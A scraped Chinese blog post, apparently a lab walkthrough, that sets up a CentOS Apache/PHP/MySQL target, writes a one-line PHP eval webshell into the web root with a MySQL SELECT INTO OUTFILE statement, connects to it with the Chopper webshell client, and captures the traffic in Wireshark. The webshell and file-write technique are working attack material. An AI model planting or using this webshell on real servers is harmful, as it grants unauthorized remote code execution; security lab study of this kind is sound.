{"blogid": "126518555", "writerAge": "码龄3年", "writerBlogNum": "35", "writerCollect": "136", "writerComment": "18", "writerFan": "191", "writerGrade": "3级", "writerIntegral": "507", "writerName": "yh野良", "writerProfileAdress": "..\\..\\static\\writer_image\\profile_126518555.jpg", "writerRankTotal": "31591", "writerRankWeekly": "5900", "writerThumb": "34", "writerVisitNum": "35127", "blog_read_count": "1393", "blog_time": "已于 2022-08-26 10:15:05 修改", "blog_title": "一句话木马SQL注入", "content": "<div class=\"article_content clearfix\" id=\"article_content\">\n<link href=\"../../static/bootstrap/css/csdnstyle.css\" rel=\"stylesheet\"/>\n<div class=\"markdown_views prism-atom-one-dark\" id=\"content_views\">\n<svg style=\"display: none;\" xmlns=\"http://www.w3.org/2000/svg\">\n<path d=\"M5,0 0,2.5 5,5z\" id=\"raphael-marker-block\" stroke-linecap=\"round\" style=\"-webkit-tap-highlight-color: rgba(0, 0, 0, 0);\"></path>\n</svg>\n<p></p>\n<div class=\"toc\">\n<h3>目录</h3>\n<ul><li><a href=\"#1_4\">1.搭建靶机环境</a></li><li><ul><li><a href=\"#1_6\">(1)实验环境及思路</a></li><li><a href=\"#2_15\">(2)搭建靶机环境</a></li></ul>\n</li><li><a href=\"#2NavicatSQL_55\">2.用Navicat构建一句话SQL注入木马</a></li><li><a href=\"#3_69\">3.通过菜刀连接靶机</a></li></ul>\n</div>\n<p></p>\n<hr/>\n<h1><a id=\"1_4\"></a>1.搭建靶机环境</h1>\n<h2><a id=\"1_6\"></a>(1)实验环境及思路</h2>\n<p>靶机：centos7 以安装好MySQL服务<br/> 攻击机：win7<br/> 使用工具：Navicat、wireshark、菜刀</p>\n<h2><a id=\"2_15\"></a>(2)搭建靶机环境</h2>\n<ul><li> <p>（1）<code>firewall-cmd --zone=public --add-port=80/tcp --permanent</code> 开80端口</p> </li><li> <p><code>systemctl restart firewalld.service</code> 重启防火墙</p> </li><li> <p>确保已安装好MySQL<img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\9d4f9dbb5063454b8466e4d4715c8de6.png\"/></p> </li><li> <p>（2）<code>rpm -ivh mysql-community-libs-compat-5.7.30-1.el7.x86_64.rpm</code>安装php所需要的依赖环境<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\b75bdcce82b0445f9eba0f5f89508c3c.png\"/></p> </li><li> <p>（3）<code>yum install php php-mysql -y</code>yum安装php<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\a18d5e93d8414105bf602cb638f6f45b.png\"/><br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\a99495056f7e42e19649e649f33be5fe.png\"/></p> </li><li> <p>（4）<code>yum -y install httpd*</code>为其安装Apache服务<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\24ce4f93d228487ea59616106894adcd.png\"/><img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\e547936600d84bc7813b84fc2d814ce1.png\"/></p> </li><li> <p>（5）<code>vi /etc/httpd/conf/httpd.conf</code>修改apache配置文件</p> </li><li> <p>在配置文件中修改如下，添加如下内容</p> </li><li> <p><code>AddType application/x-httpd-php-source .phps</code>——apache能过够解析phps文件</p> </li><li> <p><code>AddType application/x-httpd-php .php</code>——apache能过够解析php文件<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\3320324e09e9405dbac669b529ace960.png\"/></p> </li><li> <p>（6）<code>cd /var/www/html</code> apache网站的根目录</p> </li><li> <p><code>vi phpinfo.php</code></p> </li><li> <p><code>&lt;? php phpinfo(); ?&gt;</code>编写php文件，配置php网站，这是条php语句</p> </li><li> <p><code>systemctl restart httpd</code>重启apache服务<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\1521c613b3ab4fc5a99601253a37e94a.png\"/><img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\cdf1aa10e4a04686b54006b3fc5446ae.png\"/></p> </li><li> <p>(6)<code>localhost/phpinfo.php</code>firefox中输入可以访问代表网站服务搭建成功<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\0eb628bf00144a86bcc382f62e4db517.png\"/></p> </li></ul>\n<h1><a id=\"2NavicatSQL_55\"></a>2.用Navicat构建一句话SQL注入木马</h1>\n<pre><code class=\"prism language-sql\"><span class=\"token keyword\">show</span> <span class=\"token keyword\">databases</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">create</span> <span class=\"token keyword\">database</span> TEST<span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">use</span> TEST<span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">show</span> <span class=\"token keyword\">tables</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">create</span> <span class=\"token keyword\">table</span> muma<span class=\"token punctuation\">(</span>cmd <span class=\"token keyword\">text</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">insert</span> <span class=\"token keyword\">into</span> muma <span class=\"token keyword\">values</span><span class=\"token punctuation\">(</span>concat<span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;?php @eval($_POST['</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\"'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'mimi'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\"'</span><span class=\"token punctuation\">,</span><span class=\"token string\">']); ?&gt;'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span> muma<span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span> muma <span class=\"token keyword\">into</span> <span class=\"token keyword\">outfile</span> <span class=\"token string\">'/var/www/html/ma.php'</span>\n</code></pre>\n<p><img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\9e61d85b79e04eb8b14b3f5002b4ee77.png\"/></p>\n<h1><a id=\"3_69\"></a>3.通过菜刀连接靶机</h1>\n<ul><li><code>cd /var/www/html</code></li></ul>\n<p><img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\d97ac43d8afc47758bf5f98393308f35.png\"/></p>\n<ul><li><code>ifconfig</code>查看靶机IP<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\772c8c3a6b4445c89303eac3bf049647.png\"/></li><li>使用win7上的菜刀工具进行连接<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\080703edcfcf4d6883601d19f85b1f06.png\"/><br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\c6afd1424e5347958f4b16d8413c46c5.png\"/></li><li>双击进入，可以看到我们已经成功进入到靶机的数据库中<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\be2eeac878f24b0eb08fc1c612dc62a3.png\"/></li><li>我们可以用Wireshark来抓取菜刀的流量包，靶机记得开启apache服务</li><li><code>systemctl start httpd</code></li><li>启用wireshark，然后用菜刀访问我们所写入的木马文件ma.php</li><li>wireshark启用流量过滤，方便我们找到菜刀的流量包</li><li><code>ip.addr == 192.168.8.141 and http</code><br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\e8b77a4bd0a14fcda9bc4d7ee435ef33.png\"/><br/> 在这里插入图片描述</li></ul>\n</div>\n<link href=\"https://csdnimg.cn/release/blogv2/dist/mdeditor/css/editerView/markdown_views-22a2fefd3b.css\" rel=\"stylesheet\"/>\n<link href=\"https://csdnimg.cn/release/blogv2/dist/mdeditor/css/style-4f8fbf9108.css\" rel=\"stylesheet\"/>\n</div>", "first_tag": "PHP", "cpp": 0, "csharp": 0, "python": 0, "javascript": 0, "java": 0, "sql": 1, "php": 1, "time": "2022-08-26 10:15:05", "summary": "目录搭建靶机环境实验环境及思路搭建靶机环境用构建一句话注入木马通过菜刀连接靶机搭建靶机环境实验环境及思路靶机：以安装好服务攻击机：使用工具：、、菜刀搭建靶机环境开端口重启防火墙确保已安装好在这里插入图"}